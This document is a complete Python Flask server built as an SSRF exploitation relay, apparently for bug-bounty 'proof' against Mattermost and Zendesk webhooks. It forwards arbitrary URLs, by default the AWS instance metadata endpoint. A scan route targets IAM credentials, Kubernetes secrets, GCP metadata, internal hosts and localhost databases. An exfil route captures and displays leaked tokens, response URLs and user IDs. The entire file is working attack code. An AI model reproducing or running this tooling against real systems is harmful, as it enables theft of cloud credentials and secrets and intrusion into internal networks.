from flask import Flask, request, jsonify
import urllib.request
import ssl
import json
import os
from datetime import datetime

app = Flask(__name__)

# Store incoming requests as proof
request_log = []

@app.route('/')
def index():
    return jsonify({
        "status": "SSRF Relay Server Running", 
        "usage": "/relay?target=URL",
        "proof_endpoint": "/proof",
        "log_endpoint": "/log",
        "environment": "Render (AS16509 Amazon.com, Inc. - Oregon us-west-2)"
    })

@app.route('/log')
def log_request():
    """Log incoming SSRF requests as proof"""
    timestamp = datetime.utcnow().isoformat() + "Z"
    source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    all_headers = dict(request.headers)
    
    entry = {
        "timestamp": timestamp,
        "source_ip": source_ip,
        "user_agent": user_agent,
        "headers": all_headers,
        "args": dict(request.args)
    }
    request_log.append(entry)
    
    # Keep only last 100 entries
    while len(request_log) > 100:
        request_log.pop(0)
    
    return jsonify({
        "response_type": "in_channel",
        "text": f"🎯 **SSRF PROOF CAPTURED**\n\n**Timestamp:** `{timestamp}`\n**Source IP:** `{source_ip}`\n**User-Agent:** `{user_agent}`\n\n✅ Request logged on AWS Render infrastructure!",
        "username": "SSRF-Proof-Render"
    })

@app.route('/proof')
def get_proof():
    """Return all captured SSRF requests as evidence"""
    return jsonify({
        "environment": {
            "hostname": "ssrf-60a5.onrender.com",
            "asn": "AS16509 Amazon.com, Inc.",
            "region": "Oregon (Boardman) - AWS us-west-2",
            "server_time": datetime.utcnow().isoformat() + "Z"
        },
        "ssrf_requests_captured": len(request_log),
        "requests": request_log[-20:]  # Last 20 entries
    })

@app.route('/capture')
def capture():
    """Capture request details for SSRF proof - returns Mattermost format"""
    timestamp = datetime.utcnow().isoformat() + "Z"
    source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    entry = {
        "timestamp": timestamp,
        "source_ip": source_ip,
        "user_agent": user_agent,
        "path": request.full_path,
        "method": request.method
    }
    request_log.append(entry)
    
    return jsonify({
        "response_type": "in_channel",
        "text": f"🔥 **SSRF HIT FROM ZENDESK/MATTERMOST!**\n\n"
                f"**Proof of Server-Side Request:**\n"
                f"• Timestamp: `{timestamp}`\n"
                f"• Source IP: `{source_ip}`\n"
                f"• UA: `{user_agent[:80]}...`\n\n"
                f"✅ **Captured on AWS Render (AS16509)**",
        "username": "SSRF-Capture"
    })

@app.route('/relay')
def relay():
    target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
    
    try:
        # Create SSL context that ignores certificate errors
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(target, headers={
            'User-Agent': 'SSRF-Relay/1.0',
            'Accept': '*/*'
        })
        
        response = urllib.request.urlopen(req, timeout=10, context=ctx)
        data = response.read().decode('utf-8', errors='replace')
        status = f"SUCCESS - HTTP {response.status}"
        
    except urllib.error.HTTPError as e:
        data = f"HTTP Error {e.code}: {e.reason}"
        try:
            data += f"\nBody: {e.read().decode('utf-8', errors='replace')[:1000]}"
        except:
            pass
        status = f"HTTP_ERROR_{e.code}"
    except urllib.error.URLError as e:
        data = f"Connection Error: {str(e.reason)}"
        status = "CONNECTION_ERROR"
    except Exception as e:
        data = f"Error: {type(e).__name__}: {str(e)}"
        status = "ERROR"
    
    # Return in Mattermost-compatible format
    return jsonify({
        "response_type": "in_channel",
        "text": f"🔴 **SSRF RELAY - {status}**\n\n**Target:** `{target}`\n\n**Response:**\n```\n{data[:3000]}\n```",
        "username": "SSRF-Relay-Render"
    })

@app.route('/scan')
def scan_internal():
    """Scan internal services for SSRF escalation"""
    targets = [
        ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
        ("AWS IAM Creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS User Data", "http://169.254.169.254/latest/user-data"),
        ("AWS Token", "http://169.254.169.254/latest/api/token"),
        ("K8s API", "https://kubernetes.default.svc/api/v1/namespaces"),
        ("K8s Secrets", "https://kubernetes.default.svc/api/v1/secrets"),
        ("Localhost 80", "http://127.0.0.1:80/"),
        ("Localhost 8080", "http://127.0.0.1:8080/"),
        ("Localhost 3000", "http://127.0.0.1:3000/"),
        ("Localhost 5432 (Postgres)", "http://127.0.0.1:5432/"),
        ("Localhost 6379 (Redis)", "http://127.0.0.1:6379/"),
        ("Localhost 9200 (Elastic)", "http://127.0.0.1:9200/"),
        ("Internal DNS", "http://internal.mattermost.com/"),
        ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
    ]
    
    results = []
    for name, url in targets:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={'User-Agent': 'SSRF-Scanner/1.0', 'Metadata-Flavor': 'Google'})
            resp = urllib.request.urlopen(req, timeout=3, context=ctx)
            data = resp.read().decode('utf-8', errors='replace')[:500]
            results.append({"target": name, "url": url, "status": "ACCESSIBLE", "data": data})
        except urllib.error.HTTPError as e:
            results.append({"target": name, "url": url, "status": f"HTTP_{e.code}", "data": str(e.reason)})
        except Exception as e:
            results.append({"target": name, "url": url, "status": "BLOCKED", "data": str(e)[:100]})
    
    return jsonify({
        "response_type": "in_channel",
        "text": f"🔴 **INTERNAL SCAN RESULTS**\n\n" + "\n".join([f"• **{r['target']}**: {r['status']}" for r in results]),
        "full_results": results,
        "username": "SSRF-Scanner"
    })

@app.route('/exfil', methods=['GET', 'POST'])
def exfil():
    """Capture ALL request data including leaked tokens"""
    timestamp = datetime.utcnow().isoformat() + "Z"
    
    # Capture both GET args and POST form data
    args = dict(request.args)
    form = dict(request.form)
    
    # Merge for easier checking, preferring POST data if duplicate
    all_data = {**args, **form}

    full_data = {
        "timestamp": timestamp,
        "headers": dict(request.headers),
        "args": args,
        "form": form,
        "url": request.url,
        "method": request.method,
        "remote_addr": request.remote_addr
    }
    request_log.append(full_data)
    
    # Keep only last 100 entries
    while len(request_log) > 100:
        request_log.pop(0)
    
    # Format leaked tokens
    sensitive = []
    if 'token' in all_data: sensitive.append(f"🔐 Token: `{all_data['token']}`")
    if 'response_url' in all_data: sensitive.append(f"🔗 Response URL: `{all_data['response_url']}`")
    if 'user_id' in all_data: sensitive.append(f"👤 User ID: `{all_data['user_id']}`")
    if 'trigger_id' in all_data: sensitive.append(f"🎯 Trigger ID: `{all_data['trigger_id'][:50]}...`")
    
    return jsonify({
        "response_type": "in_channel", 
        "text": f"🚨 **SENSITIVE DATA CAPTURED**\n\n" + "\n".join(sensitive) if sensitive else "No sensitive params",
        "full_data": full_data,
        "username": "Data-Exfil"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
